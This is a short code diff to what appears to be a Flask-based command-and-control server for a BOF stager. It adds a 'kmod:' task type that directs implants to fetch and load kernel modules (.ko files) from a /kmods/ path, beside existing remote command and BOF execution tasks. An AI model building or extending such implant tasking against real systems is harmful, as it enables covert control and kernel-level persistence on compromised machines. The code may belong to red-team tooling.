@@ -11,6 +11,7 @@ import secrets
 app = Flask(__name__)
 
 bofsRootDir = "/bofs/"
+kmodsRootDir = "/kmods/"
 
 """
 Structure of tasks (running simple BOF):
@@ -151,6 +152,14 @@ def heartbeat():
 
     # we're dealing with BOF-stager's internal command execution here:
     if 'cmd:' in cmdData['name']:
+        return Instruction
+
+    # we're dealing with kernel module loading here:
+    if 'kmod:' in cmdData['name']:
+        # prepare instruction's: 'path' field for kernel modules
+        _, name = cmdData['name'].split(':')
+        kmodHttpPath = kmodsRootDir + name + ".ko"
+        Instruction['path'] = kmodHttpPath
         return Instruction
 
     # we're dealing with BOF execution task, so let's:
